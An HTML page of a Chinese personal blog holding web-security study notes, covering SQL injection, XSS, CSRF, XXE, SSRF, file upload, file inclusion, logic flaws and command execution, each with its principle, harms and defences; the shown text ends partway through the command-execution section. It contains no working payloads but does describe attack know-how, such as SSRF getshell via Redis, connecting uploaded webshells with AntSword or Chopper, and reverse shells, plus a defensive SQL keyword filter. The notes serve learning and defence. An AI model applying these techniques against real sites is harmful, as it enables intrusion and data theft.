<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/title.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/title.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/title.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"try-to-change.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="学会一样东西，最重要特征就是可以把一个知识点的原理弄懂，造成一次成功注入，要注意分析源码当中导致这个漏洞的问题点，又应该如何改进与防御， 不要急于求成，慢即是快，少即是多 好记性不如烂笔头，一些知识点还是要多写几遍来记住，不是简单ctrl+c&#x2F;+v就学到了，上机自己练习，打靶场，永远是最有效的方法，一定学会文章和实际操作密切结合，坚持做笔记 学东西就只当学一次，一次学到最好，不要囫囵吞枣">
<meta property="og:type" content="article">
<meta property="og:title" content="WEB学习">
<meta property="og:url" content="https://try-to-change.github.io/2022/05/28/Web-study/index.html">
<meta property="og:site_name" content="Ttoc&#39;s blog">
<meta property="og:description" content="学会一样东西，最重要特征就是可以把一个知识点的原理弄懂，造成一次成功注入，要注意分析源码当中导致这个漏洞的问题点，又应该如何改进与防御， 不要急于求成，慢即是快，少即是多 好记性不如烂笔头，一些知识点还是要多写几遍来记住，不是简单ctrl+c&#x2F;+v就学到了，上机自己练习，打靶场，永远是最有效的方法，一定学会文章和实际操作密切结合，坚持做笔记 学东西就只当学一次，一次学到最好，不要囫囵吞枣">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20210601210954715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NfcHJvZ3JhbWo=,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://try-to-change.github.io/2022/05/28/Web-study/image-20220802103546644.png">
<meta property="og:image" content="https://try-to-change.github.io/2022/05/28/Web-study/image-20220802103603770.png">
<meta property="og:image" content="https://try-to-change.github.io/2022/05/28/Web-study/image-20220909230928678.png">
<meta property="og:image" content="https://try-to-change.github.io/2022/05/28/Web-study/image-20220909231009396.png">
<meta property="og:image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2F20201009142512180.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70&refer=http%3A%2F%2Fimg-blog.csdnimg.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1656476375&t=82f2380c052f036e8454035070bc6a42">
<meta property="og:image" content="https://try-to-change.github.io/2022/05/28/Web-study/image-20220815234910350.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200226180218842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFqaWF3ZWk=,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/92c9df98952f41669db5d8b8b2ffaead.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16">
<meta property="og:image" content="https://try-to-change.github.io/2022/05/28/Web-study/image-20220801143739625.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/09dde2a7f84145e291c34a1b2f19e26e.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/1f9a0a4e11564da38bf19a9e83d3fb44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16">
<meta property="og:image" content="https://try-to-change.github.io/2022/05/28/Web-study/image-20220926223728694.png">
<meta property="og:image" content="https://try-to-change.github.io/2022/05/28/Web-study/image-20220926223749908.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16">
<meta property="og:image" content="https://try-to-change.github.io/2022/05/28/Web-study/image-20220927091524021.png">
<meta property="og:image" content="https://try-to-change.github.io/2022/05/28/Web-study/image-20220927091556911.png">
<meta property="og:image" content="https://try-to-change.github.io/2022/05/28/Web-study/image-20220903123146044.png">
<meta property="og:image" content="https://try-to-change.github.io/2022/05/28/Web-study/image-20220903123047693.png">
<meta property="og:image" content="https://pic3.zhimg.com/80/v2-a24770cd727d793d93abd89d5025ad41_hd.jpg">
<meta property="og:image" content="https://pic4.zhimg.com/80/v2-bddead1f721c42eed678d9db9527c0e7_hd.jpg">
<meta property="article:published_time" content="2022-05-28T08:01:29.902Z">
<meta property="article:modified_time" content="2022-10-04T06:30:56.530Z">
<meta property="article:author" content="Ttoc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210601210954715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NfcHJvZ3JhbWo=,size_16,color_FFFFFF,t_70">

<link rel="canonical" href="https://try-to-change.github.io/2022/05/28/Web-study/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>WEB学习 | Ttoc's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>
	
<a target="_blank" rel="noopener" href="https://github.com/try-to-change" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>

<script type="text/javascript" src="/js/src/crash_cheat.js"></script>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Ttoc's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Make progress every day</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-commonweal">

    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://try-to-change.github.io/2022/05/28/Web-study/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.png">
      <meta itemprop="name" content="Ttoc">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ttoc's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          WEB学习
        </h1>

        <div class="post-meta">
		
          
            <i class="fa fa-thumb-tack"></i>
            <font color=fa6d7a >置顶</font>
            <span class="post-meta-divider">|</span>
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-28 16:01:29" itemprop="dateCreated datePublished" datetime="2022-05-28T16:01:29+08:00">2022-05-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-10-04 14:30:56" itemprop="dateModified" datetime="2022-10-04T14:30:56+08:00">2022-10-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">网络安全学习</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>38k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>35 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><u><code>学会一样东西，最重要特征就是可以把一个知识点的原理弄懂，造成一次成功注入，要注意分析源码当中导致这个漏洞的问题点，又应该如何改进与防御，</code></u></p>
<p><u><code>不要急于求成，慢即是快，少即是多</code></u></p>
<p><u><code>好记性不如烂笔头，一些知识点还是要多写几遍来记住，不是简单ctrl+c/+v就学到了，上机自己练习，打靶场，永远是最有效的方法，一定学会文章和实际操作密切结合，坚持做笔记</code></u></p>
<p><u><code>学东西就只当学一次，一次学到最好，不要囫囵吞枣</code></u></p>
<span id="more"></span>

<h1 id="Web安全学习"><a href="#Web安全学习" class="headerlink" title="Web安全学习"></a>Web安全学习</h1><h2 id="基础漏洞知识（一）【原理-危害-防御-利用】"><a href="#基础漏洞知识（一）【原理-危害-防御-利用】" class="headerlink" title="基础漏洞知识（一）【原理+危害+防御+利用】"></a>基础漏洞知识（一）【原理+危害+防御+利用】</h2><p>–转载原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/c_programj/article/details/117452836">https://blog.csdn.net/c_programj/article/details/117452836</a></p>
<hr>
<h3 id="Sql漏洞篇"><a href="#Sql漏洞篇" class="headerlink" title="Sql漏洞篇"></a>Sql漏洞篇</h3><p><a href="#%E4%B8%80%E3%80%81sql">sql漏洞知识点记录</a></p>
<h4 id="1-sql漏洞原理"><a href="#1-sql漏洞原理" class="headerlink" title="1.sql漏洞原理"></a>1.sql漏洞原理</h4><p>指web应用程序<u><strong>对用户输入的数据合法性没有判断</strong></u>，导致攻击者可以<u><strong>构造不同的sql语句来对数据库数据库的操作</strong></u>。（web应用程序对用户输入的数据没有进行过滤，或者过滤不严，就把sql语句带进数据库中进行查询）。</p>
<p>Sql注入漏洞的产生需要满足两个条件：<br>①参数用户可控：<u><strong>前端传给后端的参数内容是用户可以控制的</strong></u>。<br>②<u><strong>参数代入数据库查询</strong></u>：传入的参数拼接到sql语句，且带入数据库查询。</p>
<h4 id="2-危害"><a href="#2-危害" class="headerlink" title="2.危害"></a>2.危害</h4><p>①数据库信息泄漏：数据库中存放的<u><strong>用户的隐私信息的泄露</strong></u>。<br>②网页篡改：通过操作数据库对特定网页进行篡改。<br>③网站被挂马，传播恶意软件：<u><strong>修改数据库一些字段的值，嵌入网马链接</strong></u>，进行挂马攻击。<br>④数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>⑤服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>⑥破坏硬盘数据，瘫痪全系统。</p>
<h4 id="3-防御"><a href="#3-防御" class="headerlink" title="3.防御"></a>3.防御</h4><p>①<u><strong>过滤危险字符</strong></u>：例如，采用正则表达式匹配union、sleep、load_file等关键字，如果匹配到，则退出程序。<br>②使用预编译语句：使用PDO预编译语句，需要注意，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的增加、删除、修改、查询。<br>③特殊字符转义、使用严格的数据类型。</p>
<hr>
<h3 id="XSS漏洞篇"><a href="#XSS漏洞篇" class="headerlink" title="XSS漏洞篇"></a>XSS漏洞篇</h3><h4 id="1-XSS漏洞原理"><a href="#1-XSS漏洞原理" class="headerlink" title="1.XSS漏洞原理"></a>1.XSS漏洞原理</h4><p>恶意攻击者<u><strong>往Web页面里嵌入脚本代码</strong></u>（<u><strong>通常是JavaScript编写的恶意代码</strong></u>），当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。（恶意攻击者<u><strong>利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码</strong></u>，嵌入到web页面中去。）</p>
<h4 id="2-危害-1"><a href="#2-危害-1" class="headerlink" title="2.危害"></a>2.危害</h4><p>①盗取用户Cookie。<br>②修改网页内容。<br>③网站挂马。<br>④利用网站重定向。<br>⑤XSS蠕虫。</p>
<h4 id="3-防御-1"><a href="#3-防御-1" class="headerlink" title="3.防御"></a>3.防御</h4><p>①过滤输入的数据：包括” ’ ”、”&lt;”、“&lt;”、“&gt;”、“on”等非法字符。<br>②对输出到页面的数据进行相应的编码转换，包括html实体编码、javascript编码等。</p>
<hr>
<h3 id="CSRF漏洞篇"><a href="#CSRF漏洞篇" class="headerlink" title="CSRF漏洞篇"></a>CSRF漏洞篇</h3><h4 id="1-CSRF漏洞原理"><a href="#1-CSRF漏洞原理" class="headerlink" title="1.CSRF漏洞原理"></a>1.CSRF漏洞原理</h4><p>因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，<u><strong>没有校验表单token或者http请求头中的referer值</strong></u>（如果您<u><strong>在网页1，点击一个链接到网页2</strong></u>，当浏览器<u><strong>请求网页2时，网页1的URL就会包含在 Referer 头信息</strong></u>中），从而<u><strong>导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为</strong></u>。</p>
<p><img src="https://img-blog.csdnimg.cn/20210601210954715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NfcHJvZ3JhbWo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>Csrf攻击过程两个重点：<br>①目标用户<u><strong>已经登录了网站</strong></u>，<u><strong>能够执行网站的功能</strong></u>。<br>②目标用户<u><strong>访问了攻击者构造的URL</strong></u>。</p>
<h4 id="2-危害-2"><a href="#2-危害-2" class="headerlink" title="2.危害"></a>2.危害</h4><p>①伪造HTTP请求进行未授权操作。<br>②篡改、盗取目标网站上的重要用户数据。<br>③未经允许执行对用户名誉或者资产有害的操作，比如：散播不良信息、进行消费等。<br>④如果通过使用社工等方式攻击网站管理员、会危害网站本身的安全性。<br>⑤作为其他攻击向量的辅助攻击手法，必须配合XSS<br>⑥传播CSRF蠕虫</p>
<h4 id="3-防御-2"><a href="#3-防御-2" class="headerlink" title="3.防御"></a>3.防御</h4><p>①验证请求的<u><strong><code>referer</code></strong></u>值，如果referer是以自己的网站开头的域名，则说明该请求来自网站自己，是合法的。<u><strong>如果referer是其他网站域名或空白，就有可能是csrf攻击，那么服务器拒绝该请求</strong></u>，但是此方法存在被绕过的可能【<u><strong>brupsuite可以抓包修改referer从而绕过前端过滤</strong></u>】。<br>②csrf攻击之所以能成功，是因为<u><strong>攻击者伪造用户的请求</strong></u>，所以抵御csrf的关键在于：在<u><strong>请求中放入攻击者不能伪造的请求</strong></u>，例如，可以在HTTP请求中加入一个随机产生的token，并在服务器端<u><strong>验证token</strong></u>【<u><strong>类似于验证码</strong></u>】，如果请求中没有token或者token内容不正确，则认为请求可能是csrf攻击，从而拒绝该请求。</p>
<hr>
<h3 id="XXE漏洞篇"><a href="#XXE漏洞篇" class="headerlink" title="XXE漏洞篇"></a>XXE漏洞篇</h3><h4 id="1-XXE漏洞原理"><a href="#1-XXE漏洞原理" class="headerlink" title="1.XXE漏洞原理"></a>1.XXE漏洞原理</h4><p>XXE漏洞（XML 外部实体注入），XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。</p>
<p>XML文档结构包括<u><strong>XML声明、DTD文档类型定义（可选）、文档元素</strong></u>。</p>
<h4 id="2-危害-3"><a href="#2-危害-3" class="headerlink" title="2.危害"></a>2.危害</h4><p>①读取任意文件。<br>②执行系统命令。<br>③探测内网端口。<br>④攻击内网网站。</p>
<h4 id="3-防御-3"><a href="#3-防御-3" class="headerlink" title="3.防御"></a>3.防御</h4><p>①进制使用<u><strong>外部实体</strong></u>，例如：<br>PHP：libxml_disable_entity_loader(true)<br>②过滤用户提交的xml数据，防止出现非法内容。</p>
<hr>
<h3 id="SSRF漏洞篇"><a href="#SSRF漏洞篇" class="headerlink" title="SSRF漏洞篇"></a>SSRF漏洞篇</h3><h4 id="1-SSRF漏洞原理"><a href="#1-SSRF漏洞原理" class="headerlink" title="1.SSRF漏洞原理"></a>1.SSRF漏洞原理</h4><p>大都是由于<u><strong>服务器提供了从其他服务器应用获取数据的功能</strong></u>且<u><strong>没有对目标地址做过滤与限制</strong></u><strong>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</strong><u><strong>利用的是服务端的请求伪造</strong></u>。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
<p><img src="/2022/05/28/Web-study/image-20220802103546644.png" alt="image-20220802103546644"></p>
<p><img src="/2022/05/28/Web-study/image-20220802103603770.png" alt="image-20220802103603770"></p>
<h4 id="2-危害-4"><a href="#2-危害-4" class="headerlink" title="2.危害"></a>2.危害</h4><p>攻击者就可以<u><strong>利用该漏洞绕过防火墙等访问限制</strong></u>，进而将受感染或存在漏洞的服务器作为代理进行端口扫描，甚至是访问内部系统数据。</p>
<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner 信息</p>
<p>2.攻击运行在内网或本地的应用程序</p>
<p>3.对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</p>
<p>4.攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</p>
<p>5.下载内网资源(如：利用file协议读取本地文件等)</p>
<p>6.进行跳板</p>
<p>7.无视cdn</p>
<p>8.利用Redis未授权访问，HTTP CRLF注入实现getshell</p>
<h4 id="3-防御-4"><a href="#3-防御-4" class="headerlink" title="3.防御"></a>3.防御</h4><p>① 限制请求的端口只能为web端口，只允许访问HTTP和HTTPS请求。<br>② 限制不能访问内网的IP，以防止对内网进行攻击。<br>③ 屏蔽返回的详细信息。<br>④ 限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line"><span class="function"><span class="title">file_get_contents</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">fsockopen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">curl_exec</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></div>

<hr>
<h3 id="文件上传漏洞篇"><a href="#文件上传漏洞篇" class="headerlink" title="文件上传漏洞篇"></a>文件上传漏洞篇</h3><h4 id="1-文件上传漏洞原理"><a href="#1-文件上传漏洞原理" class="headerlink" title="1.文件上传漏洞原理"></a>1.文件上传漏洞原理</h4><p>就是未对用户上传的文件进行检查和过滤，导致某些别有用心的用户上传了一些恶意代码或文件（asp、php、jsp等），从而控制了网站。（当文件上传时，如果服务端的脚本语言没有对上传的文件进行检查和过滤，那假如，渗透者直接上传恶意代码文件，那么就有可能直接控制整个网站，或者说以此为跳板，直接拿下服务器，这就是文件上传漏洞。）</p>
<h4 id="2-危害-5"><a href="#2-危害-5" class="headerlink" title="2.危害"></a>2.危害</h4><p><u><strong>非法用户可以利用恶意脚本文件控制整个网站，甚至控制服务器</strong></u>。这个恶意脚本文件，又称为webshell，也可将webshell脚本称为一种网页后门，webshell脚本具有很强大的功能，<u><strong>比如查看服务器目录、服务器中的文件，执行绕过命令等。</strong></u>【<strong>用蚁剑或菜刀连接上传的 php文件，输入文件中的密码</strong>】</p>
<h4 id="3-防御-5"><a href="#3-防御-5" class="headerlink" title="3.防御"></a>3.防御</h4><p>①通过白名单方式判断文件后缀是否合法。<br>②对上传的文件进行重命名。</p>
<hr>
<h3 id="文件包含漏洞篇"><a href="#文件包含漏洞篇" class="headerlink" title="文件包含漏洞篇"></a>文件包含漏洞篇</h3><p><a href="#%E4%B8%83%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含漏洞知识点记录</a></p>
<h4 id="1-文件包含漏洞原理"><a href="#1-文件包含漏洞原理" class="headerlink" title="1.文件包含漏洞原理"></a>1.文件包含漏洞原理</h4><p>开发人员将<u><strong>需要重复调用的函数写入一个文件，对该文件进行包含是产生的操作</strong></u>。这样编写代码能减少代码冗余，降低代码后期维护难度，保证网站整体风格统一：导航栏、底部footer栏等。<u><strong>文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制，包含其他恶意文件，导致了执行非预期代码</strong></u>。</p>
<h4 id="2-危害-6"><a href="#2-危害-6" class="headerlink" title="2.危害"></a>2.危害</h4><p>①获取敏感信息<br>②执行任意命令<br>③获取服务器权限</p>
<h4 id="3-防御-6"><a href="#3-防御-6" class="headerlink" title="3.防御"></a>3.防御</h4><p>①建议白名单。<br>②指定访问一定的路径，再将参数拼接到路径当中。</p>
<hr>
<h3 id="逻辑漏洞篇"><a href="#逻辑漏洞篇" class="headerlink" title="逻辑漏洞篇"></a>逻辑漏洞篇</h3><h4 id="1-逻辑漏洞原理"><a href="#1-逻辑漏洞原理" class="headerlink" title="1.逻辑漏洞原理"></a>1.逻辑漏洞原理</h4><p>指攻击者<u><strong>利用业务的设计缺陷，获取敏感信息或破坏业务的完整性</strong></u>。一般出现在<u><strong>密码修改、越权访问、密码找回、交易支付</strong></u>等功能处。</p>
<h4 id="2-危害-7"><a href="#2-危害-7" class="headerlink" title="2.危害"></a>2.危害</h4><p>任意密码修改、越权访问、密码任意找回、交易支付金额任意修改等</p>
<h4 id="3-防御-7"><a href="#3-防御-7" class="headerlink" title="3.防御"></a>3.防御</h4><h5 id="1-任意密码修改"><a href="#1-任意密码修改" class="headerlink" title="1.任意密码修改"></a>1.任意密码修改</h5><h5 id="2-越权访问"><a href="#2-越权访问" class="headerlink" title="2.越权访问"></a>2.越权访问</h5><p>越权访问漏洞产生<u><strong>主要原因是没有对用户的身份做判断和控制</strong></u>，防范这种漏洞时，可以通过session来控制。例如，在用户登录时，将username或uid写入到<code>session</code><u><strong>（会话控制，Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。）</strong></u>中取出信息，<u><strong>而不是从GET或POST取出username</strong></u>，name此时取到的username就是没有篡改的。</p>
<hr>
<h3 id="命令执行漏洞篇"><a href="#命令执行漏洞篇" class="headerlink" title="命令执行漏洞篇"></a>命令执行漏洞篇</h3><h4 id="1-命令执行漏洞原理"><a href="#1-命令执行漏洞原理" class="headerlink" title="1.命令执行漏洞原理"></a>1.命令执行漏洞原理</h4><p>应用未对用户输入做严格的检查过滤，导致用户<u><strong>输入的参数被当成命令来执行</strong></u>。攻击者可以任意执行系统命令，属于高危漏洞之一，也属于代码执行的范畴。</p>
<h4 id="2-危害-8"><a href="#2-危害-8" class="headerlink" title="2.危害"></a>2.危害</h4><p>①继承web服务程序的权限去执行系统命令或读写文件。<br>②反弹shell，获得目标服务器的权限。<br>③进一步内网渗透。</p>
